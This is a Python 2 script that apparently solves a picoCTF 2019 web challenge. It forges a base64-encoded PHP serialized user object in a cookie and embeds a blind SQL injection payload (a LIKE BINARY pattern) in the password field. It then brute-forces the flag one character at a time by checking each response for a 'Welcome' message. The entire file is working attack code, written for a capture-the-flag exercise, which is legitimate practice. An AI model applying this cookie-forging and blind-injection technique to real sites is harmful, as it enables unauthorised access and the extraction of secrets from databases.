import requests
import string
import base64
import time

def send_req(password):
    time.sleep(0.2)
    payload = 'O:8:"siteuser":2:{{s:8:"username";s:5:"admin";s:8:"password";s:{}:"{}";}}'.format(len(password), password)
    cookies = dict(user_info=base64.b64encode(payload))
    r = requests.get("https://2019shell1.picoctf.com/problem/62195/index.php?file=admin", cookies=cookies)
    if "Welcome" in r.text:
        return True
    else:
        return False

#alpha = set(string.printable) - set("'%_") # Pessimistic 
alpha = string.digits + string.ascii_letters + '{}' # Optimistic 

flag = "picoCTF{"
while True:
    for c in alpha:
        if send_req("' or password like BINARY '" + flag + c + "%"):
            flag += c
            print flag
            break
    else:
        break